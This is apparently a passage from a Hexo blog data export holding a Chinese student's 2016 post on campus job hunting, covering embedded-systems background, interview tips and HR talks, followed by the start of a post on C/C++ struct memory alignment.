PE权威指南*,*黑客大曝光*等,各种幻想,但是眼高手低,几乎看不懂里面的原理...,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.\n### 为什么涉猎安全技术?\n相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索**教育**二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷...随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.\n### 为什么看起来有些xjbg\n据说计算机类相关专业考研的专业课包括**数据结构**,**计算机组成原理**,**操作系统**,**计算机网络**.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题**你觉得你的优点和缺点是什么**我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.\n\n## 如何校招?\n首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿...\n\n## 笔试\n关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些**套路**搞明白,笔试和面试都有**套路**.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了...\n\n## 面试\n笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如**指针和引用的异同**,**线程和进程的区别**,**#define用法**,**static,const用法**,**C++多态的实现方法**,**TCP时序图**,**各种排序,查找,遍历等的算法原理**,**网络编程中IO复用的情况**等等,Linux的后台开发可以参考这个[链接](http://blog.csdn.net/huangjm_13/article/details/8799595).搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞**剑指offer**和**程序员面试宝典**等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:**\"你有什么需要问我的吗?\"**,这个时候很重要,或**削发明志**,或**力挽狂澜**.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!\n\n## HR约谈\n一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?\n\n## 总结\n感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!\n","source":"_posts/job-summary.md","raw":"---\ntitle: 求职艰辛路\ndate: 2016-10-17 16:25:59\ncategories:\n- misc\ntags:\n- misc\n---\n\n> 经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.\n\n老吴去年心得:[http://www.nephen.com/2015/11/job-summary](http://www.nephen.com/2015/11/job-summary)\n\n----------\n## 个人技术体系\n大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。\n### 为什么选择了嵌入式?\n个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课....好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了*加密与解密*,*Windows PE权威指南*,*黑客大曝光*等,各种幻想,但是眼高手低,几乎看不懂里面的原理...,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.\n### 为什么涉猎安全技术?\n相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索**教育**二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷...随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.\n### 为什么看起来有些xjbg\n据说计算机类相关专业考研的专业课包括**数据结构**,**计算机组成原理**,**操作系统**,**计算机网络**.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题**你觉得你的优点和缺点是什么**我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.\n\n## 如何校招?\n首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿...\n\n## 笔试\n关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些**套路**搞明白,笔试和面试都有**套路**.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了...\n\n## 面试\n笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如**指针和引用的异同**,**线程和进程的区别**,**#define用法**,**static,const用法**,**C++多态的实现方法**,**TCP时序图**,**各种排序,查找,遍历等的算法原理**,**网络编程中IO复用的情况**等等,Linux的后台开发可以参考这个[链接](http://blog.csdn.net/huangjm_13/article/details/8799595).搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞**剑指offer**和**程序员面试宝典**等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:**\"你有什么需要问我的吗?\"**,这个时候很重要,或**削发明志**,或**力挽狂澜**.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!\n\n## HR约谈\n一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?\n\n## 总结\n感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!\n","slug":"job-summary","published":1,"updated":"2016-11-14T02:56:11.055Z","_id":"civhnccum0006g8uam6xu0qvl","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.</p>\n</blockquote>\n<p>老吴去年心得:<a href=\"http://www.nephen.com/2015/11/job-summary\" target=\"_blank\" rel=\"external\">http://www.nephen.com/2015/11/job-summary</a></p>\n<hr>\n<h2 id=\"个人技术体系\"><a href=\"#个人技术体系\" class=\"headerlink\" title=\"个人技术体系\"></a>个人技术体系</h2><p>大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。</p>\n<h3 id=\"为什么选择了嵌入式\"><a href=\"#为什么选择了嵌入式\" class=\"headerlink\" title=\"为什么选择了嵌入式?\"></a>为什么选择了嵌入式?</h3><p>个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课….好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了<em>加密与解密</em>,<em>Windows PE权威指南</em>,<em>黑客大曝光</em>等,各种幻想,但是眼高手低,几乎看不懂里面的原理…,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.</p>\n<h3 id=\"为什么涉猎安全技术\"><a href=\"#为什么涉猎安全技术\" class=\"headerlink\" title=\"为什么涉猎安全技术?\"></a>为什么涉猎安全技术?</h3><p>相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索<strong>教育</strong>二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷…随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.</p>\n<h3 id=\"为什么看起来有些xjbg\"><a href=\"#为什么看起来有些xjbg\" class=\"headerlink\" title=\"为什么看起来有些xjbg\"></a>为什么看起来有些xjbg</h3><p>据说计算机类相关专业考研的专业课包括<strong>数据结构</strong>,<strong>计算机组成原理</strong>,<strong>操作系统</strong>,<strong>计算机网络</strong>.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题<strong>你觉得你的优点和缺点是什么</strong>我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.</p>\n<h2 id=\"如何校招\"><a href=\"#如何校招\" class=\"headerlink\" title=\"如何校招?\"></a>如何校招?</h2><p>首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿…</p>\n<h2 id=\"笔试\"><a href=\"#笔试\" class=\"headerlink\" title=\"笔试\"></a>笔试</h2><p>关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些<strong>套路</strong>搞明白,笔试和面试都有<strong>套路</strong>.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了…</p>\n<h2 id=\"面试\"><a href=\"#面试\" class=\"headerlink\" title=\"面试\"></a>面试</h2><p>笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如<strong>指针和引用的异同</strong>,<strong>线程和进程的区别</strong>,<strong>#define用法</strong>,<strong>static,const用法</strong>,<strong>C++多态的实现方法</strong>,<strong>TCP时序图</strong>,<strong>各种排序,查找,遍历等的算法原理</strong>,<strong>网络编程中IO复用的情况</strong>等等,Linux的后台开发可以参考这个<a href=\"http://blog.csdn.net/huangjm_13/article/details/8799595\" target=\"_blank\" rel=\"external\">链接</a>.搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞<strong>剑指offer</strong>和<strong>程序员面试宝典</strong>等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:<strong>“你有什么需要问我的吗?”</strong>,这个时候很重要,或<strong>削发明志</strong>,或<strong>力挽狂澜</strong>.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!</p>\n<h2 id=\"HR约谈\"><a href=\"#HR约谈\" class=\"headerlink\" title=\"HR约谈\"></a>HR约谈</h2><p>一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!</p>\n","excerpt":"","more":"<blockquote>\n<p>经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.</p>\n</blockquote>\n<p>老吴去年心得:<a href=\"http://www.nephen.com/2015/11/job-summary\">http://www.nephen.com/2015/11/job-summary</a></p>\n<hr>\n<h2 id=\"个人技术体系\"><a href=\"#个人技术体系\" class=\"headerlink\" title=\"个人技术体系\"></a>个人技术体系</h2><p>大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。</p>\n<h3 id=\"为什么选择了嵌入式\"><a href=\"#为什么选择了嵌入式\" class=\"headerlink\" title=\"为什么选择了嵌入式?\"></a>为什么选择了嵌入式?</h3><p>个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课….好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了<em>加密与解密</em>,<em>Windows PE权威指南</em>,<em>黑客大曝光</em>等,各种幻想,但是眼高手低,几乎看不懂里面的原理…,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.</p>\n<h3 id=\"为什么涉猎安全技术\"><a href=\"#为什么涉猎安全技术\" class=\"headerlink\" title=\"为什么涉猎安全技术?\"></a>为什么涉猎安全技术?</h3><p>相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索<strong>教育</strong>二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷…随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.</p>\n<h3 id=\"为什么看起来有些xjbg\"><a href=\"#为什么看起来有些xjbg\" class=\"headerlink\" title=\"为什么看起来有些xjbg\"></a>为什么看起来有些xjbg</h3><p>据说计算机类相关专业考研的专业课包括<strong>数据结构</strong>,<strong>计算机组成原理</strong>,<strong>操作系统</strong>,<strong>计算机网络</strong>.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题<strong>你觉得你的优点和缺点是什么</strong>我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.</p>\n<h2 id=\"如何校招\"><a href=\"#如何校招\" class=\"headerlink\" title=\"如何校招?\"></a>如何校招?</h2><p>首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿…</p>\n<h2 id=\"笔试\"><a href=\"#笔试\" class=\"headerlink\" title=\"笔试\"></a>笔试</h2><p>关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些<strong>套路</strong>搞明白,笔试和面试都有<strong>套路</strong>.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了…</p>\n<h2 id=\"面试\"><a href=\"#面试\" class=\"headerlink\" title=\"面试\"></a>面试</h2><p>笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如<strong>指针和引用的异同</strong>,<strong>线程和进程的区别</strong>,<strong>#define用法</strong>,<strong>static,const用法</strong>,<strong>C++多态的实现方法</strong>,<strong>TCP时序图</strong>,<strong>各种排序,查找,遍历等的算法原理</strong>,<strong>网络编程中IO复用的情况</strong>等等,Linux的后台开发可以参考这个<a href=\"http://blog.csdn.net/huangjm_13/article/details/8799595\">链接</a>.搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞<strong>剑指offer</strong>和<strong>程序员面试宝典</strong>等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:<strong>“你有什么需要问我的吗?”</strong>,这个时候很重要,或<strong>削发明志</strong>,或<strong>力挽狂澜</strong>.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!</p>\n<h2 id=\"HR约谈\"><a href=\"#HR约谈\" class=\"headerlink\" title=\"HR约谈\"></a>HR约谈</h2><p>一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!</p>\n"},{"title":"memory_align","date":"2016-08-21T13:24:53.000Z","_content":"\n\n## 关于C/C++中结构体(类)内存对齐问题  \n\n---\n\n> 各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛[stackoverflow](http://stackoverflow.com/ \"Stack Overflow\")等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．\n\n---\n可参考资料：  \n[维基百科](https://en.wikipedia.org/wiki/Data_structure_alignment#Problems \"维基百科\")\n[StackOverflow GCC Structure](http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs)\n[GCC文档](https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html)\n### 1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:  \n#### 32位编译器：\n      char ：1个字节\n      char*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   4个字节\n      long long:  8个字节\n      unsigned long:  4个字节\n#### 64位编译器：\n      char ：1个字节\n      char* (即指针变量): 8个字节\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   8个字节\n      long long:  8个字节\n      unsigned long:  8个字节  \n其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．\n\n---\n\n### 2. 变量排放规则(自己的见解)  \n#### 1. 内置类型对象(如char<1字节>、int<现代PC编译器普遍为4字节>等)的**对齐起始地址**为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.  \n#### 2. 整个结构体或者类的**大小**为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。  \n\n> 可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行**取指，译码，执行等**操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地\"串并联\"起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的\"1\"和\"0\"．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎`磕碜`的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)\n\n### 3. Win栗子如下：\n#### 1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\n![配置](/images/1.png)\n#### 2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\n![int b](/images/2.png)\n#### 3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\n![整数倍](/images/3.png)\n#### 4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\n![数组](/images/4.png)\n#### 5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\n![char](/images/5.png)\n#### 6. 说明#pragma pack (n) n非2的幂的值时候无效\n![#pragma pack (n)](/images/6.png)\n#### 7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\n![struct](/images/7.png)\n#### 8. 说明pragma pack (3)没作用\n![pack (3)](/images/8.png)\n\n### 4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\n#### 1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\n![gcc -v](/images/gcc-st-1.png)\n#### 2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\n![4 butys](/images/gcc-st-2.png)\n#### 3. 